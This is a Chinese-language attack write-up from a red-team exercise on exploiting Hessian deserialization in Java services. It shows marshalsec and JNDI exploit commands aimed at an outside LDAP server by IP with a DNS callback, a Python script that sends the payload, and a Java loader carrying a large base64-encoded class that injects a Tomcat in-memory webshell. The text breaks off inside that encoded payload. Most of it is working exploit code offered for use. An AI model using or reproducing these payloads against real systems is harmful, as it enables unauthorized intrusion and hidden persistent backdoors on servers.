# Java Hessian反序列化漏洞原生JDK不出网注入内存马

## 场景

在一次攻防演练实战过程中遇到的场景，`hessianService`接口未授权大概率是存在`Hessian`反序列化漏洞。

![image-20241018104241023](assets/image-20241018104241023.png)

在实战中大多场景是需要注入内存马以便后渗透，但大多文章只写了出网利用（打`JNDI`），但是存在各种依赖限制和网络限制，于是在实战过程中想要不出网、无依赖限制注入内存马，于是有了这篇文章

![image-20241018105926239](assets/image-20241018105926239.png)

## 出网利用

存在`SpringAbstractBeanFactoryPointcutAdvisor`

![image-20241018114237221](assets/image-20241018114237221.png)

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor ldap://101.42.172.78:1389/deserialCommonsBeanutils1 | base64 -w0 > h
```

```bash
java -jar JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar -A "vps" -C "ping qtitjhozwt.iyhc.eu.org"
```

发包：

```python
import requests
import argparse

def load(name):
    header=b'\x63\x02\x00\x48\x00\x04'+b'test'
    with open(name,'rb') as f:
        return header+f.read()

def send(url,payload):
    #proxies = {'http':'127.0.0.1:8888'}
    headers={'Content-Type':'x-application/hessian'}
    data=payload
    res=requests.post(url,headers=headers,data=data)
    return res.text

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", help="hessian site url eg.http://127.0.0.1:8080/HessianTest/hessian")
    parser.add_argument("-p",help="payload file")
    args = parser.parse_args()
    if args.u==None or args.p==None:
        print('eg. python hessian.py -u http://127.0.0.1:8080/HessianTest/hessian -p hessian')
    else:
        send(args.u, load(args.p))
if __name__ == '__main__':
    main()
```

## 不出网利用

### Java Hessian 反序列化漏洞Only JDK 注入内存马

使用`defineClass`加载内存马

```java
package ysoserial.Hessian2.poc;

import java.lang.reflect.InvocationTargetException;

public class EvilDefineClass {
    static {
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        try {
            java.lang.reflect.Method dc = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            dc.setAccessible(true);
            byte[] code = java.util.Base64.getDecoder().decode("yv66vgAAADEBewEAIm9yZy9hcGFjaGUvY29tbW9ucy9sYW5nL2ovSHR0cFV0aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAMZ2V0Q2xhc3NOYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQAnb3JnLmFwYWNoZS5jb21tb25zLlNlc3Npb25OaG54cUxpc3RlbmVyCAAIAQAPZ2V0QmFzZTY0U3RyaW5nAQAKRXhjZXB0aW9ucwEAE2phdmEvaW8vSU9FeGNlcHRpb24HAAwBABBqYXZhL2xhbmcvU3RyaW5nBwAOAQvYSDRzSUFBQUFBQUFBLzQxWGVWeFUxeFgrTGpQd2htRTBjVkFVYlpPNHd6QXdpaEFSc2dnSWdRaWpjVklNRXRNK0hnOW1kSmdaNTcwaFlodlRwamJkMG5Sdm11NUxVdHJHdHRqR1FhVWFZNWUwNmI2ays3NDNiZi92UDJuNjNmY2VBd3lEK0dONHk3M25mT2ZjN3l6M3Z1Zi9kK0VTZ08zNGo4RFdaSG9rcEtaVUxhcUh0T1RvYURKaGhDSzZZY1NTaVhBMGNmeFlUOHd3OVlTZVZpQUVWaDFSeDlSUVhFMk1oTnJqcW1IMEpOVWhPZVVTMkNTbmpvY01QVDBXMTAxQ1dQY0QrckdNYnBpeklNVUNKYmZFRWpIek5nRlhWWFdmZ0xzOU9hUUxYTmNUUytqaHpPaWducjViSFl4enhOK1QxTlI0bjVxT3lYZG4wRzFHWTRaQWRjODF1dDNpZ3dLUEYyNHNGMWhiMVZOd0FTM1NENkVKckY1a1hvSmNMMEhLS1RkQ0hxb0cycXJ6WlZzNE55aFFOTkFtVURha0QzTTkxamhoS2Q3ZHZWREJoMHFzbGJEckJLNVAyMVR0NFg4Nk9hNFBDV3l4M1YyTTFJNHhQV0ZhcnBjYkN5Y0VObDZETmxsMjdIWXpKakUxSGpzaExaZlBldHB4WE5OVEptbFZzSUVMZHpDMTlIaktUSWJhWTZrbzZSSHdwSFVqeFJnd1F2bE9SMDB6RmVyaUpXZmZscVNXWXRnUkU3aHBjU1ZMZ3NLdTVPQVJtU2FXYXhrekZnLzFxaWtKNGl5QXFieWtaVXVRT3V1WFpFWkJyY0RtYThKVEVHS3NybTNSQ3JZTDNIRDF0U3JZSWJCczNqSVZOSElvWXFyYVViNDVwYkJpUkRmbmUwSWVxNnF2R25XbVhCTjJlVkdIWmdGdlZKZlpIVlpIcldxYmpYbkVUTWNTSTVTOUJiZVdvZ2lzMVZJYTY3TEVjM2s1VDdhNmtQcHV0SlpoRzJROTJLYjYxSGhHOTJHUERkdkJyTS9YVW5BSHMwbExKa3cxbG1EcHJKdFhzbEUxSFpFTFNXaDZTL1VoSDdweHB4ZGQyQ3RRTVRKTGNtYzZPWnBqNUs2bDg5Rm1KcCs0UmZQV2gxNkV2ZlIvSHltMFl1QWs4WVlGNUM5SVl4L3V3Z0hKU1lUeG13MXhsMnBFclRDL3lvcytMUGVnaHZtZXl0RDlwcm5yM3pkNFJOZk1sb1VqMVF1SGZPakhvVExjakFFUE5udXdsYzBwNDhHcjJVRlRiRDArcUhZTTJMQThOR1FGaGhWVUlMSUZyUFg1TUFTOURBMFlwcCt0SFJFUG9rN1R5R3NOQ2xpelpTU3BPMkdZS3NQRzFyMW85dVMzRlIvaUdQWGlLTWp0amZNRWpKU3VNYk8xdEc3dTFjY2pmRk9RNGtwb3FHM2MxSmszN3FycWdUWWYwakJrZ3BoMkR5NWd1RSsyOWpFdmp1RitLc21OU1lwMjI1S0dybVhTTVhNOFJDT1c2RGhPU0g5ZU95OXhiVllVUEdBNzRQVDg4cXBDL2Y1QnZONkxrM2dERzFuZXBJSTNDaXlmMGJmM0hZSEtoU2k1TGVsTmVOaUxVM2l6VE1WeXUwSVBPQlc2ZGtZdGxneTFaWWFIOWJRK1pNOVI3MjE0dTh6QVIxZzBoV1VVUEdwMWRIVkk3c2tDSzZzS1Z2ZTc4RzR2M29uM0NQZ0dWVU8vdVdHUHJsbGJlVVdoQ010b3ZBL3ZsODUrZ0UxN0tOa1pTNmh4bmdia1Zpb25QNGpISmJjZjhtRVZLcVRZUjVnNUNmMysyY3laNzBjdXp6K0dqMHNlUGtFc2xySWFOK1QrWENCcjJTOCtoVTlMK3A5ZzRlYjJOWW9YazdyT3ZpV0xyVUNyeXpreGdjOUtuei9uZEhkN05weU1aTFJvWjB5UEQ4M1pScDlpb28ycDZjYVpYVzl4MlJaYmN0djg3dXpZdE9lMjI3ZDZwc29ja2JRK0hLZE15SUp6SkxtcHJDaHdaRm05aUphQ0xMT2N4RENxY1pXNVlZMEsxQzdSL09lYjl1RWN6c3ZvWE9EK0pYdGxKcVdudGJqVmdiNHFhK0VVTHVhRmExNWxQdVBGYVZ5bXJxR2JyWm9tdTZoOURLdzZKQVd1NEd0ZVRPSHI3RUlFejl1WnJ0WWJ2NG5ucE9LM0dIdDZjK0tFekVncmU5TXpaNXk4MDQ4OGdQQmd4dVEyTW9tNjBaaWgxYlcxUmpwbWtqN3R3ZmVKTVp4MGR0UE5TN0EwMHc5K2lCOUpEbjdNR3JMdDI1WG93VS90Z3U3VnpXaVNyTzh1Z0Rld0FLOVFIR3dFbXZvWmZpNU4vVUpneldKU0NuN0ZJb29seHBKSHVZWmRCY2djdUVaK2Y0UGZldkZyL0U3QkdxZFgxc21OcnE3TmFoUWUvTkhlT25Qay9abDJiUUk4K0NzMUd1cDM3Unh1YUJqY3ZtTlhZMlA5amtZUC9rNTZEK2l5UzFIOG4zeHAxNCthdWpyb3diK3ducFhuQmlIZzRwVTdHejl1aER5OFdQYzkxdDNESjhXNmx2S3RneHFDOTlXQktWd1g4UC9qTExTQS84V3p1RDNnLy9kWmRKN2hWQkc4dk1xaUJpcjR0eHBsZlBMWmFyd3ZzOEQ1WGVCQTdxZWtsRjBUcUpuQ3lxVXgxeEpsbllWWlllczVtUEpwQmZ4RUZiSVRPdWkzY29GU3FqUlE0NnE1TklWWFRPYmdTaXlYYnB3RFZacURLcVdSTlJiVUszR0RBOVZvYWRMNU0za1FtK1pBaUJ3RTkxN2NaRUdzbjRFUVQxQkQ0ZHlWbWl4YUxtTmJiekR3Tkc0L2ovWWlWdFpUc3k5ODZNeWk1M0U4RmdoT1lYODRlQjUzQ3pTN3A5SFhQNFdEemNXVnhmNTdPSGl2Q3dmNWVMZzI5M2hmcGR0NWR2dGZReGp0UEVaYzhNZk9JZGxjVWxsU1BJMWovWEk0aTR3L05vWGpXYnh1R2tYOWdTd2V5dUl0VTNoclpVbUF3TzhReU9LOVdUeVd4WWV6K0dnV242d3N6dUxKZ3hNb2JpNlpnRHQ4UnA2QjJLU21zWkhKY1JHWGVYZFpuSFF5Q3NCV2psYnpMNEFRYXJBVFFSNXFhN0dYQitnK2pnenlHenFKZW94aEJ4N2hjZWdjejF2VEpQZ2ltb25VaEdlWmhKTFRMbm5JUUJzUk41RzVFQjdGWm15aG5aMTRtQmFxR052ZGVNQ3lVaXhaelhGL3hlSGVnd3UwSHFTdk96bTZCZTZYYWFaRVFaR0NPZ1hiRk5RcmFGQm9YQ2pZK0YrSU50NWtiSGxRNWZVejFKSGxzZEVLZnhkSHBKV2c2SzN4MzNNT24vY2Y1dVV5Nm5zblVCbXVtZlBtYVhaUHdNVmZjTkxLN1JWWVNZeFY5R21EaEtlMzNQVTRMbEZmNEdva2FwUG9sVEVJMS9wUFBvbUtXdWJITkpHV05idHJzN2dVbm5qNXhlQno4RTNqZEQrTDVObG5ndTRzdmhHa3dyY242ZDh5bERQN1RqdjgxNU1Gb0ozNGU4aGVKMmU3T045TmlUdVowbnVaMEQza1poOFozYytJSEtCOHhPSzZnWDZzNGY4WDhFV3VtaDdoUzVpMDJHekNHZFlSdjlCSjFKZnhGZDc1T1lhbmNkYUtCTGcrOTB0UUZFd3BPQlZXY0xyVU40YzZJVTh2em1KZlloRGxZc2Y5UHppSG4vUUcvUys0TCtKVXY4dmZGY25pbDBGbUdkOVA5cnRxK1ByN3kvaEQ3amZaNi84VE5jak9YMXpVb0xEZy9TU2xtdDJWNU9JaC85L21JbFc2RjhPeDZuVWJ2Wi9KMXJWMENUenlsK0FRUndmSXhyMWM3MkZ5ZEovRnltMmNLV0VPUGMvVkZuR20xWHB5Y2I0VzN5RS9ibXJjUWM2K2ExWC9lQzREeC9FOWk3T2RkcGM0SmhOcmxoVDhIMnZJdDNWS0VnQUEIABABAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMABIAEwoADwAUAQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAFwEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEACGxpc3RlbmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHY29udGV4dAEACGNvbnRleHRzAQAQTGphdmEvdXRpbC9MaXN0OwEABHRoaXMBACRMb3JnL2FwYWNoZS9jb21tb25zL2xhbmcvai9IdHRwVXRpbDsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAkTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAOamF2YS91dGlsL0xpc3QHACQBABJqYXZhL3V0aWwvSXRlcmF0b3IHACYBAA1TdGFja01hcFRhYmxlDAASABYKAAQAKQEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMACsALAoAAgAtAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAAvADALACUAMQEAB2hhc05leHQBAAMoKVoMADMANAsAJwA1AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAA3ADgLACcAOQEAC2dldExpc3RlbmVyAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMADsAPAoAAgA9AQALYWRkTGlzdGVuZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAD8AQAoAAgBBAQAEa2V5MQEACGNoaWxkcmVuAQATTGphdmEvdXRpbC9IYXNoTWFwOwEAA2tleQEAC2NoaWxkcmVuTWFwAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3RocmVhZHMBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBNAQAQamF2YS9sYW5nL1RocmVhZAcATwEAEWphdmEvdXRpbC9IYXNoTWFwBwBRAQATamF2YS91dGlsL0FycmF5TGlzdAcAUwoAVAApAQAKZ2V0VGhyZWFkcwgAVgEADGludm9rZU1ldGhvZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DABYAFkKAAIAWgEAB2dldE5hbWUMAFwABgoAUABdAQAcQ29udGFpbmVyQmFja2dyb3VuZFByb2Nlc3NvcggAXwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABhAGIKAA8AYwEABnRhcmdldAgAZQEABWdldEZWDABnAFkKAAIAaAEABnRoaXMkMAgAaggARAEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7DABtAG4KAFIAbwEADWphdmEvdXRpbC9TZXQHAHELAHIAMQEAA2dldAwAdAA8CgBSAHUBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAHcAeAoABAB5AQAPamF2YS9sYW5nL0NsYXNzBwB7CgB8AF0BAA9TdGFuZGFyZENvbnRleHQIAH4BAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAIAAgQsAJQCCAQAVVG9tY2F0RW1iZWRkZWRDb250ZXh0CACEAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAhgCHCgBQAIgBAAh0b1N0cmluZwwAigAGCgB8AIsBABlQYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyCACNAQAfVG9tY2F0RW1iZWRkZWRXZWJhcHBDbGFzc0xvYWRlcggAjwEACXJlc291cmNlcwgAkQgAHQEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uBwCUAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWDAASAJYKAJUAlwEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCZAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAmwEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HAJ0BAAlTaWduYXR1cmUBACYoKUxqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEAE2phdmEvbGFuZy9UaHJvd2FibGUHAKEBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcAqwEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwArQCuCgBQAK8BAA5nZXRDbGFzc0xvYWRlcgwAsQCHCgB8ALIMAAUABgoAAgC0AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAtgC3CgCsALgBAAtuZXdJbnN0YW5jZQwAugA4CgB8ALsMAAoABgoAAgC9AQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAvwDACgACAMEBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAwwDECgACAMUIAKUHAKQBABFqYXZhL2xhbmcvSW50ZWdlcgcAyQEABFRZUEUMAMsAqAkAygDMAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DADOAM8KAHwA0AEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA0gEADXNldEFjY2Vzc2libGUBAAQoWilWDADUANUKANMA1gEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DADYANkKAMoA2gEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA3ADdCgDTAN4BAAdvYmplY3RzAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEACWxpc3RlbmVycwEACWFycmF5TGlzdAEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEACmlzSW5qZWN0ZWQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KVoMAOUA5goAAgDnAQAbYWRkQXBwbGljYXRpb25FdmVudExpc3RlbmVyCADpAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABYAOsKAAIA7AEAHGdldEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnMIAO4HAOEBABBqYXZhL3V0aWwvQXJyYXlzBwDxAQAGYXNMaXN0AQAlKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvdXRpbC9MaXN0OwwA8wD0CgDyAPUBABkoTGphdmEvdXRpbC9Db2xsZWN0aW9uOylWDAASAPcKAFQA+AoAVACCAQAcc2V0QXBwbGljYXRpb25FdmVudExpc3RlbmVycwgA+wEAB3RvQXJyYXkBABUoKVtMamF2YS9sYW5nL09iamVjdDsMAP0A/goAVAD/AQABaQEAAUkBAA1ldmlsQ2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEc2l6ZQEAAygpSQwBBQEGCgBUAQcBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAHQBCQoAVAEKAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEAB2lnbm9yZWQBAAliYXNlNjRTdHIBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIIAREBAAdmb3JOYW1lDAETALcKAHwBFAEADGRlY29kZUJ1ZmZlcggBFgEACWdldE1ldGhvZAwBGADPCgB8ARkBABBqYXZhLnV0aWwuQmFzZTY0CAEbAQAKZ2V0RGVjb2RlcggBHQEABmRlY29kZQgBHwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwEhAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwEsAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBLgEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwEwCgEtACkBAAUoW0IpVgwAEgEzCgEvATQBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABIBNgoBMQE3AQAEcmVhZAEABShbQilJDAE5AToKATEBOwEABXdyaXRlAQAHKFtCSUkpVgwBPQE+CgEtAT8BAAt0b0J5dGVBcnJheQEABCgpW0IMAUEBQgoBLQFDAQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5n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